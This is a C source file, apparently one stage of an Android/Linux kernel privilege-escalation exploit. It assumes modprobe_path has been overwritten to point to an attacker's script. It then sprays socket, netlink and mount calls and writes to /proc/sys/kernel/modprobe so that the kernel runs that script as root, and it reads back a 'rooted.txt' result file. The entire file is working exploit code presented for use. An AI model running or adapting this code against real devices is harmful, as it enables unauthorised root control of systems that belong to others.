/*
 * trigger_modprobe.c - Trigger kernel module load request
 *
 * This causes the kernel to call modprobe_path,
 * which we've overwritten to point to our root script.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>

static int try_socket_triggers(void)
{
    int count = 0;
    /* Try many protocol families - each miss may trigger modprobe */
    int pfs[] = {
        3,   /* AF_AX25 */
        4,   /* AF_IPX */
        5,   /* AF_APPLETALK */
        6,   /* AF_NETROM */
        9,   /* AF_X25 */
        10,  /* AF_INET6 */
        11,  /* AF_ROSE */
        12,  /* AF_DECnet */
        13,  /* AF_NETBEUI */
        15,  /* AF_NETLINK */
        16,  /* AF_PACKET */
        18,  /* AF_SNA */
        20,  /* AF_ATMPVC */
        22,  /* AF_SDP */
        23,  /* AF_IRDA */
        24,  /* AF_PPPOX */
        25,  /* AF_WANPIPE */
        26,  /* AF_LLC */
        27,  /* AF_IB */
        28,  /* AF_MPLS */
        29,  /* AF_CAN */
        30,  /* AF_TIPC */
        31,  /* AF_BLUETOOTH */
        32,  /* AF_IUCV */
        33,  /* AF_RXRPC */
        34,  /* AF_ISDN */
        35,  /* AF_PHONET */
        36,  /* AF_IEEE802154 */
        37,  /* AF_CAIF */
        38,  /* AF_ALG */
        39,  /* AF_NFC */
        40,  /* AF_VSOCK */
        41,  /* AF_KCM */
        42,  /* AF_QIPCRTR */
        43,  /* AF_SMC */
        44,  /* AF_XDP */
        45,  /* AF_MCTP */
    };
    for (int i = 0; i < (int)(sizeof(pfs)/sizeof(pfs[0])); i++) {
        int s = socket(pfs[i], SOCK_DGRAM, 0);
        if (s >= 0) {
            close(s);
            count++;
        }
        s = socket(pfs[i], SOCK_STREAM, 0);
        if (s >= 0) {
            close(s);
            count++;
        }
        s = socket(pfs[i], SOCK_RAW, 0);
        if (s >= 0) {
            close(s);
            count++;
        }
    }
    return count;
}

static int try_netlink_triggers(void)
{
    int count = 0;
    int protocols[] = {
        1,   /* NETLINK_ROUTE */
        2,   /* NETLINK_SKIP */
        3,   /* NETLINK_USERSOCK */
        4,   /* NETLINK_FIREWALL */
        5,   /* NETLINK_SOCK_DIAG */
        6,   /* NETLINK_NFLOG */
        7,   /* NETLINK_XFRM */
        9,   /* NETLINK_FIB_LOOKUP */
        10,  /* NETLINK_CONNECTOR */
        11,  /* NETLINK_NETFILTER */
        12,  /* NETLINK_IP6_FW */
        13,  /* NETLINK_DNRTMSG */
        15,  /* NETLINK_KOBJECT_UEVENT */
        16,  /* NETLINK_GENERIC */
        17,  /* NETLINK_SCSITRANSPORT */
        18,  /* NETLINK_ECRYPTFS */
        19,  /* NETLINK_RDMA */
        20,  /* NETLINK_CRYPTO */
        21,  /* NETLINK_SMC */
    };
    for (int i = 0; i < (int)(sizeof(protocols)/sizeof(protocols[0])); i++) {
        int s = socket(AF_NETLINK, SOCK_RAW, protocols[i]);
        if (s >= 0) {
            close(s);
            count++;
        }
    }
    return count;
}

static int try_mount_triggers(void)
{
    int count = 0;
    const char *fstypes[] = {
        "bogus_fs_xyz_12345",
        "ext4",
        "f2fs",
        "vfat",
        "ntfs",
        "btrfs",
        "xfs",
        "reiserfs",
        "jfs",
        "hfsplus",
        "cifs",
        "nfs",
        "nfs4",
        "iso9660",
        "udf",
        "squashfs",
        "cramfs",
        "romfs",
        "initramfs",
        "tmpfs",
        "ramfs",
        "debugfs",
        "tracefs",
        "binderfs",
    };

    mkdir("/data/local/tmp/mnt_test", 0755);
    for (int i = 0; i < (int)(sizeof(fstypes)/sizeof(fstypes[0])); i++) {
        int rc = mount("/dev/block/loop0", "/data/local/tmp/mnt_test",
                       fstypes[i], 0, NULL);
        (void)rc;
        count++;
    }
    rmdir("/data/local/tmp/mnt_test");
    return count;
}

static int try_sysctl_write(void)
{
    /* Writing to certain sysctls might trigger module loads */
    int fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
    if (fd >= 0) {
        write(fd, "/tmp/tmp", 8);
        close(fd);
        return 1;
    }
    return 0;
}

static int try_keyctl_triggers(void)
{
    /* keyctl syscall - may trigger key_type module loads */
    /* On 32-bit ARM, keyctl is syscall 311 */
    /* We'll skip this for now since it requires special headers */
    return 0;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Triggering modprobe via multiple methods...\n");
    printf("[*] If successful, /tmp/tmp will be executed as root\n\n");

    int total = 0;

    printf("  [1] Socket protocol triggers... ");
    int c = try_socket_triggers();
    printf("%d calls\n", c);
    total += c;

    printf("  [2] Netlink protocol triggers... ");
    c = try_netlink_triggers();
    printf("%d calls\n", c);
    total += c;

    printf("  [3] Filesystem mount triggers... ");
    c = try_mount_triggers();
    printf("%d calls\n", c);
    total += c;

    printf("  [4] Sysctl write attempt... ");
    c = try_sysctl_write();
    printf("%d calls\n", c);
    total += c;

    printf("\n[*] Total trigger attempts: %d\n", total);
    printf("[*] Check /data/local/tmp/rooted.txt for results\n");

    /* Also try to read the file to give time for async execution */
    sleep(2);

    struct stat st;
    if (stat("/data/local/tmp/rooted.txt", &st) == 0) {
        printf("\n[+] rooted.txt EXISTS! Size: %d bytes\n", (int)st.st_size);
        printf("--- contents ---\n");
        FILE *f = fopen("/data/local/tmp/rooted.txt", "r");
        if (f) {
            char buf[512];
            while (fgets(buf, sizeof(buf), f)) {
                printf("%s", buf);
            }
            fclose(f);
            printf("--- end ---\n");
        }
    } else {
        printf("\n[-] rooted.txt not found yet. Try running again or check manually.\n");
    }

    return 0;
}
